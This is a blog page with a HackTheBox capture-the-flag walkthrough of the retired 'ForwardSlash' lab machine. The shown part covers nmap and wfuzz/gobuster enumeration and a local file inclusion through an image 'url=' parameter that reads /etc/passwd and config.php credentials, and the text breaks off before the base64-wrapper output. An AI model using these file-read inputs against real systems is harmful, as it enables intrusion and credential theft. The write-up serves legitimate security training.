<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="Quick Summary   → A linux machine which vulnerable to LFI or Directory Traversal which the attacker can enumerate stuffs like file:&#x2F;&#x2F;etc&#x2F;passwd using php-wrapper.   Penetration Testing Methodologies">
<meta property="og:type" content="article">
<meta property="og:title" content="HackTheBox - ForwardSlash ⚔️">
<meta property="og:url" content="https://ph-payas0.github.io/2020-07-03/HackTheBox-ForwardSlash/index.html">
<meta property="og:site_name" content="❯ PΛYΛƧ0">
<meta property="og:description" content="Quick Summary   → A linux machine which vulnerable to LFI or Directory Traversal which the attacker can enumerate stuffs like file:&#x2F;&#x2F;etc&#x2F;passwd using php-wrapper.   Penetration Testing Methodologies">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://ph-payas0.github.io/img/fslash/forward-slash.png">
<meta property="og:image" content="https://ph-payas0.github.io/img/fslash/fslash-homepage.png">
<meta property="og:image" content="https://ph-payas0.github.io/img/fslash/fslash-login.png">
<meta property="og:image" content="https://ph-payas0.github.io/img/fslash/fslash-sign-up.png">
<meta property="og:image" content="https://ph-payas0.github.io/img/fslash/fslash-myaccoun-page.png">
<meta property="og:image" content="https://ph-payas0.github.io/img/fslash/fslash-etc-passwd.png">
<meta property="og:image" content="https://ph-payas0.github.io/img/fslash/flash-config-php.png">
<meta property="og:image" content="https://ph-payas0.github.io/img/fslash/fslash-base64.png">
<meta property="og:image" content="https://www.hackthebox.eu/badge/image/128965">
<meta property="article:published_time" content="2020-07-02T21:52:37.000Z">
<meta property="article:modified_time" content="2020-07-19T00:29:10.948Z">
<meta property="article:author" content="medz">
<meta property="article:tag" content="retired">
<meta property="article:tag" content="LFI">
<meta property="article:tag" content="directory-traversal">
<meta property="article:tag" content="php-wrapper">
<meta property="article:tag" content="Cryptography">
<meta property="article:tag" content="linux">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://ph-payas0.github.io/img/fslash/forward-slash.png">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon-1.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/android-chrome-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>HackTheBox - ForwardSlash ⚔️</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
<meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="❯ PΛYΛƧ0" type="application/atom+xml">
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/search/">Search</a></li>
         
          <li><a href="/tags/">Tags</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Posts</a></li>
         
          <li><a href="/projects/">Projects</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" href="/2020-06-18/HackTheBox-ServMon/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://ph-payas0.github.io/2020-07-03/HackTheBox-ForwardSlash/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://ph-payas0.github.io/2020-07-03/HackTheBox-ForwardSlash/&text=HackTheBox - ForwardSlash ⚔️" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://ph-payas0.github.io/2020-07-03/HackTheBox-ForwardSlash/&title=HackTheBox - ForwardSlash ⚔️" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ph-payas0.github.io/2020-07-03/HackTheBox-ForwardSlash/&is_video=false&description=HackTheBox - ForwardSlash ⚔️" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=HackTheBox - ForwardSlash ⚔️&body=Check out this article: https://ph-payas0.github.io/2020-07-03/HackTheBox-ForwardSlash/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://ph-payas0.github.io/2020-07-03/HackTheBox-ForwardSlash/&title=HackTheBox - ForwardSlash ⚔️" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://ph-payas0.github.io/2020-07-03/HackTheBox-ForwardSlash/&title=HackTheBox - ForwardSlash ⚔️" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://ph-payas0.github.io/2020-07-03/HackTheBox-ForwardSlash/&title=HackTheBox - ForwardSlash ⚔️" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://ph-payas0.github.io/2020-07-03/HackTheBox-ForwardSlash/&title=HackTheBox - ForwardSlash ⚔️" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://ph-payas0.github.io/2020-07-03/HackTheBox-ForwardSlash/&name=HackTheBox - ForwardSlash ⚔️&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://ph-payas0.github.io/2020-07-03/HackTheBox-ForwardSlash/&t=HackTheBox - ForwardSlash ⚔️" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Quick-Summary"><span class="toc-number">1.</span> <span class="toc-text">Quick Summary</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Penetration-Testing-Methodologies"><span class="toc-number">2.</span> <span class="toc-text">Penetration Testing Methodologies</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Network-Scanning"><span class="toc-number">3.</span> <span class="toc-text">Network Scanning</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Walkthrough"><span class="toc-number">3.1.</span> <span class="toc-text">Walkthrough</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-results"><span class="toc-number">3.2.</span> <span class="toc-text">Nmap results</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumeration"><span class="toc-number">4.</span> <span class="toc-text">Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ForwardSlash-Web"><span class="toc-number">4.1.</span> <span class="toc-text">ForwardSlash Web</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Create-account"><span class="toc-number">4.2.</span> <span class="toc-text">Create account</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Post-Exploitation"><span class="toc-number">5.</span> <span class="toc-text">Post - Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-Enumeration"><span class="toc-number">5.1.</span> <span class="toc-text">Web Enumeration</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploitation"><span class="toc-number">6.</span> <span class="toc-text">Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#The-hunt-continuous"><span class="toc-number">6.1.</span> <span class="toc-text">The hunt continuous</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Bypass-403"><span class="toc-number">6.2.</span> <span class="toc-text">Bypass 403</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Login-via-SSH"><span class="toc-number">6.3.</span> <span class="toc-text">Login via SSH</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Privilege-Escalation-to-Pain"><span class="toc-number">6.4.</span> <span class="toc-text">Privilege Escalation to Pain</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Get-user-PAIN"><span class="toc-number">6.5.</span> <span class="toc-text">Get user PAIN</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Get-user-txt"><span class="toc-number">6.6.</span> <span class="toc-text">Get user.txt</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">7.</span> <span class="toc-text">Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Cryptography"><span class="toc-number">7.1.</span> <span class="toc-text">Cryptography</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cyphertext"><span class="toc-number">7.2.</span> <span class="toc-text">Cyphertext</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Encrypter"><span class="toc-number">7.3.</span> <span class="toc-text">Encrypter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Decrypt"><span class="toc-number">7.4.</span> <span class="toc-text">Decrypt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Get-the-root-flag"><span class="toc-number">7.5.</span> <span class="toc-text">Get the root flag</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
        <div class="content index py4">
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        HackTheBox - ForwardSlash ⚔️
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">❯ PΛYΛƧ0</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2020-07-02T21:52:37.000Z" itemprop="datePublished">03-07-2020</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/HackTheBox/">HackTheBox</a> › <a class="category-link" href="/categories/HackTheBox/PenTesting/">PenTesting</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link" href="/tags/Cryptography/" rel="tag">Cryptography</a>, <a class="tag-link" href="/tags/LFI/" rel="tag">LFI</a>, <a class="tag-link" href="/tags/directory-traversal/" rel="tag">directory-traversal</a>, <a class="tag-link" href="/tags/linux/" rel="tag">linux</a>, <a class="tag-link" href="/tags/php-wrapper/" rel="tag">php-wrapper</a>, <a class="tag-link" href="/tags/retired/" rel="tag">retired</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <p><img src="/img/fslash/forward-slash.png" alt="HackTheBox-ForwardSlash" title="ForwardSlash"></p>
<hr>
<h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>   → A linux machine which vulnerable to <code>LFI</code> or <code>Directory Traversal</code> which the attacker can enumerate stuffs like <code>file://etc/passwd</code> using <code>php-wrapper</code>. </p>
<hr>
<h2 id="Penetration-Testing-Methodologies"><a href="#Penetration-Testing-Methodologies" class="headerlink" title="Penetration Testing Methodologies"></a>Penetration Testing Methodologies</h2><ol>
<li><p><strong>Network Scanning</strong></p>
<p>→ Nmap scan</p>
<p>→ discover open ports and what services are running</p>
</li>
<li><p><strong>Enumeration</strong></p>
<p>→ unning <code>wfuzz</code> to enumerate potential web directories</p>
<p>→ Found <code>login</code> and <code>registration</code> page</p>
<p>→ Create an account and login</p>
<p>→ In profile view we have an option to change <code>profile picture</code></p>
</li>
<li><p><strong>Post - Exploitation</strong></p>
<p>→ run <code>wfuzz</code> to enumerate <code>subdomains</code></p>
<p>→ run <code>gobuster</code> to enumerate potential web directories and I found <code>config.php</code></p>
<p>→ trying to upload any image and intercept the request</p>
<p>→ insert <code>file:///etc/passwd</code> in <code>url</code> parameter’ here we have local file inclusion</p>
</li>
<li><p><strong>Exploitation</strong></p>
<p>→ read <code>config.php</code> via local file read</p>
<p>→ run <code>dirsearch</code> to search another web parameters’ and I found <code>dev</code> that has forbidden</p>
<p>→ with <code>php-wrapper</code> we can access <code>dev/index.php</code> converted to <code>base64</code> code</p>
<p>→ decode and we can get <code>php scripts</code> that has credentials in it</p>
<p>→ login to <code>SSH</code> with user <code>chiv</code></p>
<p>→ Privilege Escalation to get user <code>pain</code></p>
<p>→ finally got the <code>user.txt</code></p>
</li>
<li><p><strong>Privilege Escalation</strong></p>
<p>→ Analyze the encrypter python file</p>
<p>→ make a script to decrypt the <code>cyphertext</code></p>
<p>→ run the backups as have sudo privileges</p>
<p>→ mount the folder to mapped images &amp; get rsa keys</p>
<p>→ Finally got the <code>root.txt</code></p>
</li>
</ol>
<hr>
<h2 id="Network-Scanning"><a href="#Network-Scanning" class="headerlink" title="Network Scanning"></a>Network Scanning</h2><h3 id="Walkthrough"><a href="#Walkthrough" class="headerlink" title="Walkthrough"></a>Walkthrough</h3><p>→ I always begin at <strong><em>NMAP</em></strong> to look on the services what is running. I always use</p>
<hr>
<ul>
<li>-sV      ⇒ Probe open ports to determine service/version info</li>
<li>-sC      ⇒ equivalent to —script=default</li>
<li>-A-      ⇒ Agressive scan</li>
<li>-oN      ⇒ to save our scan results to a text file</li>
</ul>
<hr>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">nmap -sV -sC -A <span class="number">10.10</span><span class="number">.10</span><span class="number">.183</span> -oN nmap-ForwardSlash</span><br></pre></td></tr></table></figure>

<hr>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">root in htb/boxes/ForwardSlash </span><br><span class="line">❯ nmap -sV -sC -A <span class="number">10.10</span><span class="number">.10</span><span class="number">.183</span> -oN nmap-ForwardSlash</span><br><span class="line">Starting Nmap <span class="number">7.80</span> ( https:<span class="comment">//nmap.org ) at 2020-04-26 06:43 PST</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">10.10</span><span class="number">.10</span><span class="number">.183</span></span><br><span class="line">Host is up (<span class="number">0.20</span>s latency).</span><br><span class="line">Not shown: <span class="number">998</span> closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">22</span>/tcp <span class="built_in">open</span>  ssh     OpenSSH <span class="number">7.6</span>p1 Ubuntu <span class="number">4u</span>buntu0<span class="number">.3</span> (Ubuntu Linux; protocol <span class="number">2.0</span>)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   <span class="number">2048</span> <span class="number">3</span>c:<span class="number">3b</span>:eb:<span class="number">54</span>:<span class="number">96</span>:<span class="number">81</span>:<span class="number">1</span>d:da:d7:<span class="number">96</span>:c7:<span class="number">0f</span>:b4:<span class="number">7</span>e:e1:cf (RSA)</span><br><span class="line">|   <span class="number">256</span> f6:b3:<span class="number">5f</span>:a2:<span class="number">59</span>:e3:<span class="number">1</span>e:<span class="number">57</span>:<span class="number">35</span>:<span class="number">36</span>:c3:fe:<span class="number">5</span>e:<span class="number">3</span>d:<span class="number">1f</span>:<span class="number">66</span> (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> <span class="number">1b</span>:de:b8:<span class="number">07</span>:<span class="number">35</span>:e8:<span class="number">18</span>:<span class="number">2</span>c:<span class="number">19</span>:d8:cc:dd:<span class="number">77</span>:<span class="number">9</span>c:f2:<span class="number">5</span>e (ED25519)</span><br><span class="line"><span class="number">80</span>/tcp <span class="built_in">open</span>  http    Apache httpd <span class="number">2.4</span><span class="number">.29</span> ((Ubuntu))</span><br><span class="line">|_http-title: Did <span class="keyword">not</span> follow redirect to http:<span class="comment">//forwardslash.htb</span></span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (If you know what OS is <span class="built_in">running</span> on it, see https:<span class="comment">//nmap.org/submit/ ).</span></span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">OS:SCAN(V=<span class="number">7.80</span>%E=<span class="number">4</span>%D=<span class="number">4</span>/<span class="number">26</span>%OT=<span class="number">22</span>%CT=<span class="number">1</span>%CU=<span class="number">31634</span>%PV=Y%DS=<span class="number">2</span>%DC=T%G=Y%TM=<span class="number">5</span>EA4BD4</span><br><span class="line">OS:<span class="number">2</span>%P=x86_64-pc-linux-gnu)SEQ(SP=FE%GCD=<span class="number">1</span>%ISR=<span class="number">110</span>%TI=Z%CI=Z%II=I%TS=A)SEQ(</span><br><span class="line">OS:SP=FE%GCD=<span class="number">1</span>%ISR=<span class="number">110</span>%TI=Z%CI=Z%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3=</span><br><span class="line">OS:M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=FE88%W2=FE</span><br><span class="line">OS:<span class="number">88</span>%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=<span class="number">40</span>%W=FAF0%O=M54DNNSNW7</span><br><span class="line">OS:%CC=Y%Q=)T1(R=Y%DF=Y%T=<span class="number">40</span>%S=O%A=S+%F=AS%RD=<span class="number">0</span>%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=</span><br><span class="line">OS:Y%T=<span class="number">40</span>%W=<span class="number">0</span>%S=A%A=Z%F=R%O=%RD=<span class="number">0</span>%Q=)T5(R=Y%DF=Y%T=<span class="number">40</span>%W=<span class="number">0</span>%S=Z%A=S+%F=AR%O=%</span><br><span class="line">OS:RD=<span class="number">0</span>%Q=)T6(R=Y%DF=Y%T=<span class="number">40</span>%W=<span class="number">0</span>%S=A%A=Z%F=R%O=%RD=<span class="number">0</span>%Q=)T7(R=Y%DF=Y%T=<span class="number">40</span>%W=<span class="number">0</span></span><br><span class="line">OS:%S=Z%A=S+%F=AR%O=%RD=<span class="number">0</span>%Q=)U1(R=Y%DF=N%T=<span class="number">40</span>%IPL=<span class="number">164</span>%UN=<span class="number">0</span>%RIPL=G%RID=G%RIP</span><br><span class="line">OS:CK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=<span class="number">40</span>%CD=S)</span><br><span class="line"></span><br><span class="line">Network Distance: <span class="number">2</span> hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE (<span class="keyword">using</span> port <span class="number">110</span>/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">199.15</span> ms <span class="number">10.10</span><span class="number">.14</span><span class="number">.1</span></span><br><span class="line"><span class="number">2</span>   <span class="number">197.28</span> ms <span class="number">10.10</span><span class="number">.10</span><span class="number">.183</span></span><br><span class="line"></span><br><span class="line">OS <span class="keyword">and</span> Service detection performed. Please report any incorrect results at https:<span class="comment">//nmap.org/submit/ .</span></span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned in <span class="number">62.66</span> seconds</span><br><span class="line"></span><br><span class="line">root in htb/boxes/ForwardSlash took <span class="number">1</span>m2s </span><br><span class="line">❯</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="Nmap-results"><a href="#Nmap-results" class="headerlink" title="Nmap results"></a>Nmap results</h3><p>So there’s only 2 port open.</p>
<ul>
<li>22       ⇒ which is running a <code>SSH Client</code></li>
<li>80       ⇒ which basically a web service</li>
</ul>
<hr>
<h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><h3 id="ForwardSlash-Web"><a href="#ForwardSlash-Web" class="headerlink" title="ForwardSlash Web"></a>ForwardSlash Web</h3><p>Since there’s web service I always looking that first :</p>
<p><img src="/img/fslash/fslash-homepage.png" alt="HackTheBox-ForwardSlash" title="ForwardSlash"></p>
<p>As you can see’ it seems that this website is hacked.</p>
<p>I run <code>wfuzz</code> if i can get <code>subdomains</code> so :</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">root in htb/boxes/ForwardSlash </span><br><span class="line">❯ wfuzz  --hh 0 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt  -H 'Host: FUZZ.forwardslash.htb' -u http://10.10.10.183/</span><br><span class="line"></span><br><span class="line">Warning: Pycurl is <span class="keyword">not</span> compiled against Openssl. Wfuzz might <span class="keyword">not</span> work correctly when fuzzing SSL sites. Check Wfuzz<span class="number">'</span>s documentation <span class="keyword">for</span> more information.</span><br><span class="line"></span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz <span class="number">2.4</span><span class="number">.5</span> - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: http:<span class="comment">//10.10.10.183/</span></span><br><span class="line">Total requests: <span class="number">4997</span></span><br><span class="line"></span><br><span class="line">===================================================================</span><br><span class="line">ID           Response   Lines    Word     Chars       Payload                                                                                                                   </span><br><span class="line">===================================================================</span><br><span class="line"></span><br><span class="line"><span class="number">000000055</span>:   <span class="number">302</span>        <span class="number">0</span> L      <span class="number">6</span> W      <span class="number">33</span> Ch       <span class="string">"backup"</span>                                                                                                                  </span><br><span class="line"><span class="number">000000690</span>:   <span class="number">400</span>        <span class="number">12</span> L     <span class="number">53</span> W     <span class="number">422</span> Ch      <span class="string">"gc._msdcs"</span>                                                                                                               </span><br><span class="line"></span><br><span class="line">Total time: <span class="number">151.6011</span></span><br><span class="line">Processed Requests: <span class="number">4997</span></span><br><span class="line">Filtered Requests: <span class="number">4995</span></span><br><span class="line">Requests/sec.: <span class="number">32.96148</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root in htb/boxes/ForwardSlash took <span class="number">2</span>m32s </span><br><span class="line">❯</span><br></pre></td></tr></table></figure>

<p>so there is <code>http://backup.forwardslash.htb</code> going on that it’s a register and login page .</p>
<p><img src="/img/fslash/fslash-login.png" alt="HackTheBox-ForwardSlash" title="ForwardSlash"></p>
<p>and the sign up page</p>
<p><img src="/img/fslash/fslash-sign-up.png" alt="HackTheBox-ForwardSlash" title="ForwardSlash"></p>
<h3 id="Create-account"><a href="#Create-account" class="headerlink" title="Create account"></a>Create account</h3><p>To test’ i created my account and I was able to change my profile picture’ one thing I can do with this is to upload an malicious image to gain reverse shell but it will not work on that .</p>
<p><img src="/img/fslash/fslash-myaccoun-page.png" alt="HackTheBox-ForwardSlash" title="ForwardSlash"></p>
<p>So by uploading image I try to intercept the request and I found a potential vulnerabilities which is the <code>url=</code> parameter.</p>
<p>I tried to input <code>file:///etc/passwd</code> and I can get right response</p>
<p><img src="/img/fslash/fslash-etc-passwd.png" alt="HackTheBox-ForwardSlash" title="ForwardSlash"></p>
<p>Next i run <code>gobuster</code> to get another parameters :</p>
<h2 id="Post-Exploitation"><a href="#Post-Exploitation" class="headerlink" title="Post - Exploitation"></a>Post - Exploitation</h2><h3 id="Web-Enumeration"><a href="#Web-Enumeration" class="headerlink" title="Web Enumeration"></a>Web Enumeration</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root in htb/boxes/ForwardSlash </span><br><span class="line">❯ gobuster dir -w /usr/share/wordlists/dirbuster/directory-<span class="built_in">list</span><span class="number">-2.3</span>-medium.txt -x php -u http:<span class="comment">//backup.forwardslash.htb/ -o fslash-directories</span></span><br><span class="line"></span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3<span class="number">.0</span><span class="number">.1</span></span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:            http:<span class="comment">//backup.forwardslash.htb/</span></span><br><span class="line">[+] Threads:        <span class="number">10</span></span><br><span class="line">[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-<span class="built_in">list</span><span class="number">-2.3</span>-medium.txt</span><br><span class="line">[+] Status codes:   <span class="number">200</span>,<span class="number">204</span>,<span class="number">301</span>,<span class="number">302</span>,<span class="number">307</span>,<span class="number">401</span>,<span class="number">403</span></span><br><span class="line">[+] User Agent:     gobuster/<span class="number">3.0</span><span class="number">.1</span></span><br><span class="line">[+] Extensions:     php,asp,aspx,jpg,txt,html</span><br><span class="line">[+] Follow Redir:   <span class="literal">true</span></span><br><span class="line">[+] Timeout:        <span class="number">10</span>s</span><br><span class="line">===============================================================</span><br><span class="line"><span class="number">2020</span>/<span class="number">04</span>/<span class="number">21</span> <span class="number">10</span>:<span class="number">27</span>:<span class="number">17</span> Starting gobuster</span><br><span class="line">===============================================================</span><br><span class="line">/index.php (Status: <span class="number">200</span>)</span><br><span class="line">/login.php (Status: <span class="number">200</span>)</span><br><span class="line">/<span class="keyword">register</span>.php (Status: <span class="number">200</span>)</span><br><span class="line">/welcome.php (Status: <span class="number">200</span>)</span><br><span class="line">/dev (Status: <span class="number">403</span>)</span><br><span class="line">/api.php (Status: <span class="number">200</span>)</span><br><span class="line">/environment.php (Status: <span class="number">200</span>)</span><br><span class="line">/logout.php (Status: <span class="number">200</span>)</span><br><span class="line">/<span class="built_in">config</span>.php (Status: <span class="number">200</span>)</span><br><span class="line">/hof.php (Status: <span class="number">200</span>)</span><br></pre></td></tr></table></figure>


<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><h3 id="The-hunt-continuous"><a href="#The-hunt-continuous" class="headerlink" title="The hunt continuous"></a>The hunt continuous</h3><p>so there is <code>/dev/</code> which 403 Status meaning it is forbidden or is not allowed &amp; <code>/config.php</code> directory.</p>
<p>I tried to read <code>config.php</code> via local file inclusion and it returns web credentials.</p>
<p><img src="/img/fslash/flash-config-php.png" alt="HackTheBox-ForwardSlash" title="ForwardSlash"></p>
<h3 id="Bypass-403"><a href="#Bypass-403" class="headerlink" title="Bypass 403"></a>Bypass 403</h3><p>Next is the <code>/dev</code> directory but we are not allowed to access so I search on google to bypass it and I found this on <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phpfilter" target="_blank" rel="noopener">PayloadAllTheThings</a> about <code>php-wrapper</code></p>
<p>with that method we can convert it to <code>base64</code> and decode it .</p>
<p><img src="/img/fslash/fslash-base64.png" alt="HackTheBox-ForwardSlash" title="ForwardSlash"></p>
<p>here is the full base64 code I got :</p>
